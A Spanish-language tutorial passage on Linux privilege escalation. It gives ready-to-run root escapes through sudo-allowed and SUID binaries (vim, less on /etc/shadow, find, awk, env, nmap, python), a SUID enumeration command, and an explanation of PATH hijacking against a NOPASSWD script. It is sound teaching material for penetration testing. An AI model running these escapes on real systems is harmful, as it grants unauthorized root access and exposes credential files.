## SUDO: el vector #1 real

`sudo -l` te dice qué puedes ejecutar sin password. La regla de oro: **si puedes
ejecutar CUALQUIER binario que tenga escape a shell, tienes root**.

```bash
# Los clásicos de GTFOBins (todos con sudo delante):
sudo vim -c ':!bash'                  # vim → shell
sudo less /etc/shadow                 # less → !sh dentro
sudo find / -exec /bin/bash \;        # find -exec
sudo awk 'BEGIN {system("/bin/bash")}' # awk system()
sudo env /bin/bash                    # env ejecuta un binario
sudo nmap --interactive               # nmap viejo → !sh
```

**La regla**: antes de intentar exploit complejo, mira `sudo -l` + GTFOBins.sh.

## SUID: el bit que otorga poderes

Ya conoces SUID de CS101. Ahora, la explotación:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Los SUID que DEBES buscar en GTFOBins:
- `find`, `vim`, `less`, `more`, `awk`, `env`, `nmap`, `bash`, `cp`, `mv`, `python`
- Cualquier binario con SUID root que no esté en la lista "esperada" (passwd, sudo,
  ping, su, mount)

```bash
# Si find es SUID root:
find . -exec /bin/bash -p \;         # -p preserva el bit SUID → bash root

# Si python es SUID:
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
```

## La pregunta del millón

¿Y si `sudo -l` muestra `(root) NOPASSWD: /opt/mi_script.sh`? Ese script NO está en
GTFOBins... pero ¿qué hace? Si llama a comandos SIN ruta absoluta (`tar` en vez de
`/usr/bin/tar`), puedes hacer **PATH hijacking**: crear tu propio `tar` en /tmp,
modificar PATH, y cuando el script lo llame... ejecuta TU binario como root.
